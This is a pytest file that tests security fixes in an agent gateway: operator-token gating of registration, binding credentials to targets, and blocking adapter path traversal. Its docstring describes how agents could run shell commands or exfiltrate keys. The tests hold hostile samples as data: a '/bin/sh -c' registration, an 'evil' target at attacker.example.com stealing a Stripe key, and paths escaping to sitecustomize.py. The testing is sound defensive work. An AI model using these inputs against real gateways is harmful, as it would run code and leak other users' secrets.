"""Gateway policy: who may register targets, and which target may use which key.

Two audits independently found the same pair of holes. Registering a target was
an ordinary tool call, and gateway_register_mcp spawns the command it is given,
so any agent could run anything as the hub user. And a credential was usable by
whatever target named it, so an agent could register a target pointing at a host
it controlled, reference someone else's key, and read the secret back out of the
response. Both defeat the vault's stated promise that agents never see keys.
"""

import pytest

from conftest import OPERATOR_TOKEN
import team_coordinator as tc


# --- The registration gate ---

@pytest.mark.parametrize("call", [
    lambda: tc.gateway_register_rest("x", "https://api.example.com"),
    lambda: tc.gateway_register_mcp("x", "/bin/sh"),
    lambda: tc.gateway_unregister("x"),
    lambda: tc.gateway_toggle("x", False),
    lambda: tc.gateway_set_credential("k", "v", targets="*"),
    lambda: tc.gateway_delete_credential("k"),
    lambda: tc.gateway_generate_adapter('{"openapi":"3.0.0","paths":{}}'),
])
def test_privileged_tools_refuse_without_the_token(call):
    assert "Refused" in call()


def test_the_rce_primitive_is_gated():
    """gateway_register_mcp spawns command+args, so this is the sharpest one."""
    out = tc.gateway_register_mcp("pwn", "/bin/sh", args='["-c","echo owned"]')
    assert "Refused" in out
    assert "pwn" not in tc._gw_load()["targets"]


def test_a_wrong_token_is_refused():
    out = tc.gateway_register_rest("x", "https://api.example.com",
                                   operator_token="not-the-token")
    assert "not valid" in out
    assert "x" not in tc._gw_load()["targets"]


def test_the_right_token_is_accepted():
    out = tc.gateway_register_rest("x", "https://api.example.com",
                                   operator_token=OPERATOR_TOKEN)
    assert "Registered" in out
    assert "x" in tc._gw_load()["targets"]


def test_unconfigured_server_says_how_to_enable(monkeypatch):
    monkeypatch.setattr(tc, "OPERATOR_TOKEN", "")
    out = tc.gateway_register_mcp("x", "/bin/sh", operator_token="anything")
    assert "TEAM_OPERATOR_TOKEN is not set" in out


def test_refusal_never_echoes_the_real_token():
    out = tc.gateway_register_rest("x", "https://api.example.com", operator_token="guess")
    assert OPERATOR_TOKEN not in out


def test_unprivileged_tools_still_need_no_token():
    """Coordination must not become operator-only -- only registration did."""
    assert "joined" in tc.join_team("Backend", "Ben").lower()
    tc.post_message("Backend", "hello")
    assert "Vault is empty" in tc.gateway_list_credentials()
    assert tc.gateway_list_targets()


# --- Credential binding ---

def test_setting_a_credential_requires_a_binding():
    out = tc.gateway_set_credential("k", "v", operator_token=OPERATOR_TOKEN)
    assert "Refused" in out and "which targets" in out
    assert "k" not in tc._vault_load()


def test_binding_is_recorded_and_reported():
    out = tc.gateway_set_credential("stripe_key", "sk_live_x", targets="stripe,billing",
                                    operator_token=OPERATOR_TOKEN)
    assert "stripe, billing" in out
    assert tc._gw_load()["credential_targets"]["stripe_key"] == ["stripe", "billing"]


def test_a_target_cannot_use_a_key_bound_elsewhere():
    tc.gateway_set_credential("stripe_key", "sk_live_x", targets="stripe",
                              operator_token=OPERATOR_TOKEN)
    # The exfiltration shape: a second target that names someone else's key.
    tc.gateway_register_rest("evil", "https://attacker.example.com", auth_type="bearer",
                             credential_key="stripe_key", operator_token=OPERATOR_TOKEN)
    out = tc.gateway_call_rest("evil", "/collect", agent="Backend")
    assert "Refused to call evil" in out
    assert "not bound" in out
    assert "sk_live_x" not in out


def test_the_denial_is_audited():
    tc.gateway_set_credential("k", "v", targets="good", operator_token=OPERATOR_TOKEN)
    tc.gateway_register_rest("evil", "https://attacker.example.com", auth_type="bearer",
                             credential_key="k", operator_token=OPERATOR_TOKEN)
    tc.gateway_call_rest("evil", "/x", agent="Backend")
    last = tc._gw_load()["audit"][-1]
    assert last["status"] == "credential-denied"
    assert last["ok"] is False


def test_star_permits_any_target():
    tc.gateway_set_credential("k", "v", targets="*", operator_token=OPERATOR_TOKEN)
    gw = tc._gw_load()
    assert tc._gw_cred_allowed(gw, "k", "anything")


def test_an_unbound_legacy_key_still_works():
    """Vaults written before binding existed must keep working; doctor flags them."""
    tc._vault_mutate(lambda v: v.__setitem__("legacy", "value"))
    gw = tc._gw_load()
    assert tc._gw_cred_allowed(gw, "legacy", "any-target")


def test_env_injection_respects_the_binding():
    """The MCP path resolves vault: refs into a spawned process's environment."""
    tc.gateway_set_credential("tok", "s3cret", targets="allowed",
                              operator_token=OPERATOR_TOKEN)
    assert tc._gw_resolve_env({"T": "vault:tok"}, "allowed") == {"T": "s3cret"}
    assert tc._gw_resolve_env({"T": "vault:tok"}, "other") == {"T": ""}


def test_deleting_a_credential_drops_its_binding():
    tc.gateway_set_credential("k", "v", targets="a", operator_token=OPERATOR_TOKEN)
    tc.gateway_delete_credential("k", operator_token=OPERATOR_TOKEN)
    assert "k" not in tc._gw_load().get("credential_targets", {})


# --- Adapter write containment ---

SPEC = '{"openapi":"3.0.0","info":{"title":"T","version":"1"},"paths":{"/a":{"get":{}}}}'


def test_out_path_cannot_escape_the_adapter_dir(tmp_path):
    escape = tmp_path / "sitecustomize.py"
    out = tc.gateway_generate_adapter(SPEC, out_path=str(escape),
                                      operator_token=OPERATOR_TOKEN)
    assert "must stay inside ADAPTER_DIR" in out
    assert not escape.exists()


def test_out_path_cannot_traverse_upward():
    out = tc.gateway_generate_adapter(SPEC, out_path="../../escaped.py",
                                      operator_token=OPERATOR_TOKEN)
    assert "must stay inside ADAPTER_DIR" in out


def test_a_normal_adapter_still_writes():
    out = tc.gateway_generate_adapter(SPEC, name="ok", operator_token=OPERATOR_TOKEN)
    assert "Generated MCP adapter" in out
    assert (tc.ADAPTER_DIR / "ok.py").exists()
